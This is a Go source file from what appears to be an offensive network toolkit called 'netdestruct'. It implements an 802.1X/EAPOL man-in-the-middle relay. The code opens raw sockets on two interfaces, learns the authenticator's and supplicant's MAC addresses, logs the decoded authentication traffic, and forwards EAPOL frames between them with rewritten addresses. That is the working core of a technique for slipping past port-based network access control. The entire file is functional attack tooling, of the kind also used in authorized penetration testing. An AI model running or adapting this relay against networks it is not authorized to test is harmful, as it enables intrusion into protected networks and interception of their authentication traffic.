package dot1xmitm

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"

	"netdestruct/libs/intelligence-gathering/dot1xenum"
)

const dot1xTag = "\x1b[38;5;223m[802.1X]\x1b[0m"

const ethTypeDot1X = 0x888e

type rawSocket interface {
	Send(frame []byte) error
	Recv(buf []byte) (int, error)
	Close() error
}

// MitM bridges 802.1X/EAPOL between an authenticator and a supplicant.
type MitM struct {
	Interface1 string // authenticator side
	Interface2 string // supplicant side
	SourceMAC  string // optional override; defaults to each interface MAC when relaying locally
}

func (m *MitM) Run() error {
	iface1, err := net.InterfaceByName(m.Interface1)
	if err != nil {
		return fmt.Errorf("interface1 %q: %w", m.Interface1, err)
	}
	iface2, err := net.InterfaceByName(m.Interface2)
	if err != nil {
		return fmt.Errorf("interface2 %q: %w", m.Interface2, err)
	}
	if m.Interface1 == m.Interface2 {
		return fmt.Errorf("interface1 and interface2 must be different")
	}

	sock1, err := openRawSocket(iface1)
	if err != nil {
		return err
	}
	defer sock1.Close()
	sock2, err := openRawSocket(iface2)
	if err != nil {
		return err
	}
	defer sock2.Close()

	relayMAC1, err := resolveRelayMAC(iface1, m.SourceMAC)
	if err != nil {
		return err
	}
	relayMAC2, err := resolveRelayMAC(iface2, m.SourceMAC)
	if err != nil {
		return err
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	stop := make(chan struct{})
	go func() {
		<-sig
		close(stop)
		fmt.Printf("\n%s MitM stopped.\n", dot1xTag)
		os.Exit(0)
	}()

	fmt.Printf("%s Waiting for authenticator 802.1X frame on %s...\n", dot1xTag, iface1.Name)
	macAuth, err := learnPeerMAC(sock1, stop, "authenticator")
	if err != nil {
		return err
	}
	fmt.Printf("%s Authenticator MAC = %s\n", dot1xTag, formatMAC(macAuth))

	fmt.Printf("%s Waiting for supplicant 802.1X frame on %s...\n", dot1xTag, iface2.Name)
	macSupp, err := learnPeerMAC(sock2, stop, "supplicant")
	if err != nil {
		return err
	}
	fmt.Printf("%s Supplicant MAC = %s\n", dot1xTag, formatMAC(macSupp))
	fmt.Printf("%s Bridging 802.1X between %s and %s (Ctrl+C to stop)\n", dot1xTag, iface1.Name, iface2.Name)

	type rxPkt struct {
		side int
		data []byte
	}
	ch := make(chan rxPkt, 64)
	var wg sync.WaitGroup
	recv := func(side int, sock rawSocket) {
		defer wg.Done()
		buf := make([]byte, 65535)
		for {
			select {
			case <-stop:
				return
			default:
			}
			n, err := sock.Recv(buf)
			if err != nil {
				select {
				case <-stop:
					return
				default:
				}
				return
			}
			frame := append([]byte{}, buf[:n]...)
			if !isDot1XFrame(frame) {
				continue
			}
			select {
			case ch <- rxPkt{side: side, data: frame}:
			case <-stop:
				return
			}
		}
	}
	wg.Add(2)
	go recv(1, sock1)
	go recv(2, sock2)

	for {
		select {
		case <-stop:
			wg.Wait()
			return nil
		case pkt := <-ch:
			m.handlePacket(pkt.side, pkt.data, sock1, sock2, macAuth, macSupp, relayMAC1, relayMAC2)
		}
	}
}

func (m *MitM) handlePacket(side int, frame []byte, sock1, sock2 rawSocket, macAuth, macSupp, relayMAC1, relayMAC2 net.HardwareAddr) {
	src := ethernetSrcMAC(frame)
	if len(src) != 6 {
		return
	}

	if pkt, ok := dot1xenum.FormatPacket(frame); ok {
		dir := "authenticator"
		if side == 2 {
			dir = "supplicant"
		}
		fmt.Printf("%s Recieved 802.1X data from %s (%s):\n%s\n\n", dot1xTag, pkt.SourceMAC, dir, pkt.Body)
	}

	payload, ok := dot1xPayload(frame)
	if !ok {
		return
	}

	switch side {
	case 1: // authenticator -> supplicant
		if bytesEqual(src, macSupp) || bytesEqual(src, relayMAC2) {
			return
		}
		out := buildRelayFrame(macSupp, macAuth, payload)
		_ = sock2.Send(out)
	case 2: // supplicant -> authenticator
		if bytesEqual(src, macAuth) || bytesEqual(src, relayMAC1) {
			return
		}
		out := buildRelayFrame(macAuth, macSupp, payload)
		_ = sock1.Send(out)
	}
}

func learnPeerMAC(sock rawSocket, stop <-chan struct{}, role string) (net.HardwareAddr, error) {
	buf := make([]byte, 65535)
	for {
		select {
		case <-stop:
			return nil, fmt.Errorf("stopped while learning %s MAC", role)
		default:
		}
		n, err := sock.Recv(buf)
		if err != nil {
			return nil, fmt.Errorf("learn %s MAC: %w", role, err)
		}
		if !isDot1XFrame(buf[:n]) {
			continue
		}
		src := ethernetSrcMAC(buf[:n])
		if len(src) == 6 {
			return src, nil
		}
	}
}

func resolveRelayMAC(iface *net.Interface, override string) (net.HardwareAddr, error) {
	if strings.TrimSpace(override) != "" {
		m, err := net.ParseMAC(strings.TrimSpace(override))
		if err != nil {
			return nil, fmt.Errorf("invalid --src-mac: %w", err)
		}
		if len(m) != 6 {
			return nil, fmt.Errorf("invalid --src-mac length")
		}
		return m, nil
	}
	if len(iface.HardwareAddr) != 6 {
		return nil, fmt.Errorf("interface %s has invalid MAC", iface.Name)
	}
	return iface.HardwareAddr, nil
}

func isDot1XFrame(frame []byte) bool {
	if isSLL(frame) {
		return len(frame) >= 16 && binary.BigEndian.Uint16(frame[14:16]) == ethTypeDot1X
	}
	if len(frame) < 14 {
		return false
	}
	return binary.BigEndian.Uint16(frame[12:14]) == ethTypeDot1X
}

func ethernetSrcMAC(frame []byte) net.HardwareAddr {
	if isSLL(frame) {
		if len(frame) < 12 {
			return nil
		}
		return net.HardwareAddr(append([]byte{}, frame[6:12]...))
	}
	if len(frame) < 12 {
		return nil
	}
	return net.HardwareAddr(append([]byte{}, frame[6:12]...))
}

func dot1xPayload(frame []byte) ([]byte, bool) {
	if isSLL(frame) {
		if len(frame) < 16 {
			return nil, false
		}
		return frame[16:], true
	}
	if len(frame) < 14 {
		return nil, false
	}
	return frame[14:], true
}

func buildRelayFrame(dst, src net.HardwareAddr, payload []byte) []byte {
	out := make([]byte, 14+len(payload))
	copy(out[0:6], dst)
	copy(out[6:12], src)
	out[12] = 0x88
	out[13] = 0x8e
	copy(out[14:], payload)
	return out
}

func isSLL(frame []byte) bool {
	if len(frame) < 16 {
		return false
	}
	pktType := uint16(frame[0])<<8 | uint16(frame[1])
	if pktType > 4 {
		return false
	}
	return uint16(frame[2])<<8|uint16(frame[3]) == 1 &&
		uint16(frame[4])<<8|uint16(frame[5]) == 6
}

func bytesEqual(a, b net.HardwareAddr) bool {
	return len(a) == 6 && len(b) == 6 && a[0] == b[0] && a[1] == b[1] && a[2] == b[2] && a[3] == b[3] && a[4] == b[4] && a[5] == b[5]
}

func formatMAC(mac net.HardwareAddr) string {
	if len(mac) != 6 {
		return "unknown"
	}
	return fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5])
}
